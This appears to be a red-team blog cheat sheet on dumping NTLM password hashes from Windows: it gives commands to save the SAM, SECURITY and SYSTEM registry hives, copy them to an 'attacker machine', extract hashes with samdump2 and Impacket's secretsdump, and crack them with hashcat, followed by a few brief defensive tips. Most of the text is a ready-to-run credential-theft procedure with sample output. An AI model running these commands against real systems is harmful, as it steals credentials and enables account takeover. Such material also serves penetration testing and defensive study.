---
title: "🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)"
date: 2026-01-13
tags: ['windows', 'ntlm', 'hash-dumping', 'samdump2', 'secretsdump', 'impacket', 'hashcat', 'red-teaming', 'post-exploitation', 'password-cracking', 'offline-attacks', 'registry-hive', 'windows-security', 'privilege-escalation', 'active-directory']
---

### Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)

Run these commands on the target Windows machine:

```powershell
reg.exe save hklm\sam sam
reg.exe save hklm\security security
reg.exe save hklm\system system
````

* These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory.
* 📂 Copy these files to your attacker machine for offline cracking.

---

# 🔍 Step 2: Extract Hashes from Saved Files

Two popular tools to extract NTLM hashes:

### Using `samdump2`:

```bash
samdump2 ./system ./sam
```

### Using Impacket's `secretsdump.py`:

```bash
secretsdump.py -sam sam -system system LOCAL
```

---

# 📄 Sample Output Explained

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

* 👤 **Username** (e.g., Administrator)
* 🆔 **User RID/Group** (e.g., 500)
* 🔐 **LM hash** (usually empty/disabled)
* 🗝️ **NT hash** (this is what you crack)

---

# 🛠️ Step 3: Crack NTLM Hashes

Extract NT hashes (4th field) and save in `hashes.txt`:

```
549a1bcb88e35dc18c7a0b0168631411
31d6cfe0d16ae931b73c59d7e0c089c0
30e87bf999828446a1c1209ddde4c450
```

### Crack with Hashcat:

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
```

* `-m 1000`: NTLM hash mode
* `-a 0`: Dictionary attack mode
* `hashes.txt`: file with extracted hashes
* `wordlist.txt`: your password list (e.g., rockyou.txt)

---

# 🛡️ Defensive Tips

* 🚫 Disable LM hashes via Group Policy or registry.
* 🔒 Enforce NTLMv2 and SMB signing.
* 🔑 Use strong, complex passwords.
* 👀 Monitor and restrict access to registry hives.